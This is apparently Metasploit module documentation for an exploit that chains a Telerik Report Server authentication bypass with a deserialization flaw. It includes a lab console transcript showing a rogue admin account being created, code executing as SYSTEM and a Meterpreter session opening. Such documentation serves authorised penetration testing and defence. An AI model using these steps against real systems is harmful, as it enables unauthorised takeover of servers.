## Vulnerable Application
This module chains an authentication bypass vulnerability (CVE-2024-4358) with a deserialization vulnerability
(CVE-2024-1800) to obtain remote code execution against Telerik Report Server version 10.0.24.130 and prior.
The authentication bypass flaw allows an unauthenticated user to create a new user with administrative privileges.
The USERNAME datastore option can be used to authenticate with an existing account to prevent the creation of a
new one. The deserialization flaw works by uploading a specially crafted report that when loaded will execute an
OS command as NT AUTHORITY\SYSTEM. The module will automatically delete the created report but not the account
because users are unable to delete themselves.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/windows/http/telerik_report_server_deserialization`
1. Set the `RHOSTS`, `PAYLOAD` and payload-related options
1. Do: `run`

## Options

### USERNAME
Username for the existing account. A new account with random username will be used unless specified.

### PASSWORD
Password for the account. If a new account is created, then a random value wil be used unless specified. If an
existing account is used, the password will be used as-is.

## Scenarios

### Telerik Report Server 8.0.22.225 on Windows Server 2022

```
metasploit-framework (S:0 J:0) exploit(windows/http/telerik_report_server_deserialization) > set RHOSTS 192.168.159.27
RHOSTS => 192.168.159.27
metasploit-framework (S:0 J:0) exploit(windows/http/telerik_report_server_deserialization) > set VERBOSE true
VERBOSE => true
metasploit-framework (S:0 J:0) exploit(windows/http/telerik_report_server_deserialization) > set PAYLOAD cmd/windows/powershell/meterpreter/bind_tcp
PAYLOAD => cmd/windows/powershell/meterpreter/bind_tcp
metasploit-framework (S:0 J:0) exploit(windows/http/telerik_report_server_deserialization) > check

[*] Using auxiliary/scanner/http/telerik_report_server_auth_bypass as check
[*] Detected Telerik Report Server version: 8.0.22.225.
[+] 192.168.159.27:83 - The target is vulnerable. Telerik Report Server 8.0.22.225 is affected.
metasploit-framework (S:0 J:0) exploit(windows/http/telerik_report_server_deserialization) > run

[*] Powershell command length: 4211
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Using auxiliary/scanner/http/telerik_report_server_auth_bypass as check
[*] Detected Telerik Report Server version: 8.0.22.225.
[+] The target is vulnerable. Telerik Report Server 8.0.22.225 is affected.
[*] Creating a new administrator account using CVE-2024-4358
[+] Created account: benny:g7RkmoaboNexvOKh (Note: This account will not be deleted by the module)
[+] Successfully authenticated as benny
[*] Using category: SamplesX
[*] Created report: tD8xpobpBn
[+] The server responded with an error indicating that the payload was executed
[*] Started bind TCP handler against 192.168.159.27:4444
[-] The connection was refused by the remote host (192.168.159.27:4444).
[-] The connection was refused by the remote host (192.168.159.27:4444).
[-] The connection was refused by the remote host (192.168.159.27:4444).
[*] Sending stage (176198 bytes) to 192.168.159.27
[*] Meterpreter session 1 opened (192.168.250.134:46613 -> 192.168.159.27:4444) at 2024-06-06 14:37:18 -0400
[*] Deleting report 'tD8xpobpBn' (ID: 64897ea2acf)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : SRV-DOM
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : labs1collabu0
Logged On Users : 14
Meterpreter     : x86/windows
meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > 
```
